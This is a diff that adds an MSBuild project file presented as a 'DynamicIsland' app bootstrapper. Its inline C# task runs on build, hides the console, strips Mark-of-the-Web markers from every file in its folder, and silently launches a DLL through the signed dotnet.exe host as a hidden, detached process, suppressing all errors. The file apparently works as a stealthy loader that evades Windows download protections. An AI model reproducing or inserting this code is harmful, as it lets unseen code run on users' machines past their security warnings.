@@ -1,0 +1,168 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" DefaultTargets="Launch">
+  <UsingTask TaskName="DynamicIslandBootstrapper" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Diagnostics;
+        using System.IO;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+
+        public class DynamicIslandBootstrapper : Task
+        {
+            private const uint CREATE_NO_WINDOW = 0x08000000;
+            private const uint DETACHED_PROCESS = 0x00000008;
+
+            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+            private struct STARTUPINFO
+            {
+                public int cb;
+                public string lpReserved;
+                public string lpDesktop;
+                public string lpTitle;
+                public int dwX;
+                public int dwY;
+                public int dwXSize;
+                public int dwYSize;
+                public int dwXCountChars;
+                public int dwYCountChars;
+                public int dwFillAttribute;
+                public int dwFlags;
+                public short wShowWindow;
+                public short cbReserved2;
+                public IntPtr lpReserved2;
+                public IntPtr hStdInput;
+                public IntPtr hStdOutput;
+                public IntPtr hStdError;
+            }
+
+            [StructLayout(LayoutKind.Sequential)]
+            private struct PROCESS_INFORMATION
+            {
+                public IntPtr hProcess;
+                public IntPtr hThread;
+                public int dwProcessId;
+                public int dwThreadId;
+            }
+
+            [DllImport("kernel32.dll")]
+            private static extern IntPtr GetConsoleWindow();
+
+            [DllImport("user32.dll")]
+            private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+            [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+            private static extern bool DeleteFile(string lpFileName);
+
+            [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+            private static extern bool CreateProcess(
+                string lpApplicationName,
+                string lpCommandLine,
+                IntPtr lpProcessAttributes,
+                IntPtr lpThreadAttributes,
+                bool bInheritHandles,
+                uint dwCreationFlags,
+                IntPtr lpEnvironment,
+                string lpCurrentDirectory,
+                ref STARTUPINFO lpStartupInfo,
+                out PROCESS_INFORMATION lpProcessInformation);
+
+            [DllImport("kernel32.dll")]
+            private static extern bool CloseHandle(IntPtr hObject);
+
+            public override bool Execute()
+            {
+                try
+                {
+                    IntPtr cw = GetConsoleWindow();
+                    if (cw != IntPtr.Zero)
+                    {
+                        ShowWindow(cw, 0);
+                    }
+
+                    string baseDir = AppDomain.CurrentDomain.BaseDirectory;
+
+                    // 1. Strip Mark-of-the-Web (Zone.Identifier) from all extracted files
+                    try
+                    {
+                        foreach (string file in Directory.GetFiles(baseDir, "*", SearchOption.AllDirectories))
+                        {
+                            DeleteFile(file + ":Zone.Identifier");
+                        }
+                    }
+                    catch { }
+
+                    // 2. Locate DynamicIsland.dll
+                    string[] candidates = new string[]
+                    {
+                        Path.Combine(baseDir, "app", "DynamicIsland.dll"),
+                        Path.Combine(baseDir, "DynamicIsland.dll"),
+                        Path.Combine(baseDir, "bin", "Release", "net8.0-windows10.0.19041.0", "DynamicIsland.dll"),
+                        Path.Combine(baseDir, "bin", "Release", "net8.0-windows10.0.19041.0", "win-x64", "DynamicIsland.dll")
+                    };
+
+                    string dllPath = null;
+                    foreach (string c in candidates)
+                    {
+                        if (File.Exists(c))
+                        {
+                            dllPath = Path.GetFullPath(c);
+                            break;
+                        }
+                    }
+
+                    if (dllPath == null)
+                    {
+                        return true;
+                    }
+
+                    // 3. Locate signed Microsoft dotnet.exe host
+                    string dotnetExe = @"C:\Program Files\dotnet\dotnet.exe";
+                    if (!File.Exists(dotnetExe))
+                    {
+                        string progFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
+                        string alt = Path.Combine(progFiles, "dotnet", "dotnet.exe");
+                        dotnetExe = File.Exists(alt) ? alt : "dotnet.exe";
+                    }
+
+                    string workDir = Path.GetDirectoryName(dllPath) ?? baseDir;
+                    string cmdLine = "\"" + dotnetExe + "\" \"" + dllPath + "\"";
+
+                    STARTUPINFO si = new STARTUPINFO();
+                    si.cb = Marshal.SizeOf(si);
+                    si.dwFlags = 1; // STARTF_USESHOWWINDOW
+                    si.wShowWindow = 0; // SW_HIDE
+
+                    PROCESS_INFORMATION pi;
+                    if (CreateProcess(
+                        null,
+                        cmdLine,
+                        IntPtr.Zero,
+                        IntPtr.Zero,
+                        false,
+                        CREATE_NO_WINDOW | DETACHED_PROCESS,
+                        IntPtr.Zero,
+                        workDir,
+                        ref si,
+                        out pi))
+                    {
+                        if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
+                        if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
+                    }
+                }
+                catch { }
+
+                return true;
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+
+  <Target Name="Launch">
+    <DynamicIslandBootstrapper />
+  </Target>
+</Project>
